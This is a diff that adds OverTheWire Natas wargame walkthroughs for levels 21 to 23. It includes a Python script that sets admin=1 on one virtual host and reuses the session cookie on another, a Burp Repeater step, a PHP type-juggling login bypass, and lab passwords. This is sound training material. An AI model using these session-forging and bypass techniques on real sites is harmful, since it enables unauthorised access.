@@ -268,22 +268,22 @@
 
   
 - Step 7: It has XOR encoded data. So, We will find the key. So, use online php , Then write php code.
--
--        php
--        <html>
--        <body>
 
--         <?php
+-      php
+       <html>
+        <body>
 
--         $xor_encrypted_text = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=");
--         $variable = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
--         $original_text = json_encode($variable);
+          <?php
 
--         function xor_encrypt($a, $b) {
-  -       $outText = '';
+         $xor_encrypted_text = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=");
+         $variable = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+        $original_text = json_encode($variable);
 
-   -     for ($i = 0; $i < strlen($a); $i++) {
-    -     $outText .= $a[$i] ^ $b[$i];
+         function xor_encrypt($a, $b) {
+         $outText = '';
+
+        for ($i = 0; $i < strlen($a); $i++) {
+         $outText .= $a[$i] ^ $b[$i];
           }
 
           echo $outText;
@@ -759,6 +759,166 @@
 - Step 4: Using try\nadmin 1 , But there is no output
 
   <img width="956" height="473" alt="image" src="https://github.com/user-attachments/assets/e4e1d9e9-6eaf-4039-96ff-803dec44b8dc" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+- ## Level-21
+- Username : natas21
+- Password : BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+- Domain : http://natas21.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas21.natas.labs.overthewire.org, Then login with username and password
+- Step 2: Lets view the source code
+  <img width="1237" height="628" alt="image" src="https://github.com/user-attachments/assets/3616ca06-7102-4daf-ac42-c78c6a4437f7" />
+
+ - Step 3: But it has no clue in that code, So we will open another link at what we get from the page
+
+  <img width="945" height="637" alt="image" src="https://github.com/user-attachments/assets/273b1e2a-b534-4be2-898d-7846b217a8f0" />
+
+  - Step 4: Lets view the source code
+
+    <img width="937" height="671" alt="image" src="https://github.com/user-attachments/assets/e36c91a3-97eb-44eb-a13f-160c6a5b4d9c" />
+
+- Step 5: It has both website hosted same server using diffrent virtual host, The virtual host method for hosting multiple domains in a single server
+
+- Step 6: So, we will Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+-     import requests
+
+      username = 'natas21'
+      password = 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'
+
+      url_experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug'
+      url_main = 'http://natas21.natas.labs.overthewire.org'
+
+      session = requests.Session()
+
+       # --------------------------------------------------
+      # Step 1: Set admin=1
+      # --------------------------------------------------
+
+      response = session.post(
+      url_experimenter,
+      data={
+        "admin": "1",
+        "submit": "Update"
+      },
+      auth=(username, password)
+      )
+
+       print("Experimenter response:")
+      print(response.text)
+  
+      # --------------------------------------------------
+      # Step 2: Extract PHPSESSID manually
+      # --------------------------------------------------
+
+      phpsessid = session.cookies.get('PHPSESSID')
+      print("\nPHPSESSID:", phpsessid)
+
+      # --------------------------------------------------
+      # Step 3: Send same session ID to main site
+       # --------------------------------------------------
+
+      response = requests.get(
+       url_main,
+      cookies={"PHPSESSID": phpsessid},
+      auth=(username, password)
+      )
+
+      print("\nMain site response:")
+      print(response.text)
+
+
+- Step 7: Then you will get the password for Natas22
+
+<img width="1388" height="556" alt="image" src="https://github.com/user-attachments/assets/35224aae-fe99-4c05-9ed4-c60fcb93f3fc" />
+
+
+- ## Level-22
+- Username : natas22
+- Password : d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
+- Domain : http://natas22.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas22.natas.labs.overthewire.org, Then login with username and password
+- Step 2: Lets view the source code
+- Step 3: In that source code revelio function is used to get the password for level-22 (type revelio in link then go to burpsuite try next step)
+
+  <img width="1016" height="627" alt="image" src="https://github.com/user-attachments/assets/f0839c9d-b83f-429a-a7ff-233425f3b3cc" />
+
+- Step 4: Then we will set up to proxy on Burp suite in fire fox browser (Send), In that source code http link search along with /?revelio
+
+- Step 5: Then switch on the intercept on (Receive), Then it will catch the request
+
+  <img width="1265" height="675" alt="image" src="https://github.com/user-attachments/assets/b37464d7-9fc5-4cfd-8791-9a57af334709" />
+
+- Step 6: Then navigate to http history, Then you will see the natas22 http link. Then click on that link, Then you will see the request
+
+- Step 7: Then right click on that request. you will see the option of export. Then click on send Repeater.
+
+- Step 8: Click on Repeater. Whenever once a highlight after send repeater, which is placed in menus bar
+
+- Step 9: In that response you will see the password
+
+  <img width="1257" height="648" alt="image" src="https://github.com/user-attachments/assets/16bdcb37-eb82-487e-a123-92ed66109bab" />
+
+
+- ## Level-23
+- Username : natas23
+- Password : dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
+- Domain : http://natas23.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas23.natas.labs.overthewire.org, Then login with username and password
+
+- Step 2: Lets view the source code
+
+  <img width="1111" height="627" alt="image" src="https://github.com/user-attachments/assets/405bcfdc-6559-4f34-bf8f-d84292c42cea" />
+
+- Step 3: In that source code iloveyou >10 numarical value in php code is 11.
+
+- Step 4: It is a php type juggling converts the leading digits to an integer, making it 11iloveyou behave as 11.
+
+- Step 5: Then we will enter 11iloveyou then click on login.
+
+  <img width="711" height="727" alt="image" src="https://github.com/user-attachments/assets/97088ea6-5cf4-427c-a5a3-6e82c790281f" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
